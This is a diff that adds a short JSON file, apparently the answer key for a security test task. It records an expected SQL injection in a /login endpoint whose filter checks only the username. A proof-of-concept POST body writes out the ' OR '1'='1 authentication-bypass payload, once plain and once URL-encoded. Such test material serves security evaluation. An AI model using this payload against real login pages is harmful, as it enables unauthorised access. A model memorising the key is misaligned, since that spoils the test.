@@ -1,0 +1,13 @@
+{
+  "expected_vulnerability": "SQLi",
+  "severity": "Critical",
+  "oracle": "auth_bypass_or_query_tampering",
+  "bypass_technique": "inject_via_unfiltered_password_field",
+  "expected_payload_pattern": "username=admin&password=' OR '1'='1",
+  "poc": {
+    "method": "POST",
+    "path": "/login",
+    "body_example": "username=admin&password=%27+OR+%271%27%3D%271",
+    "indicator": "filter_only_covers_username"
+  }
+}
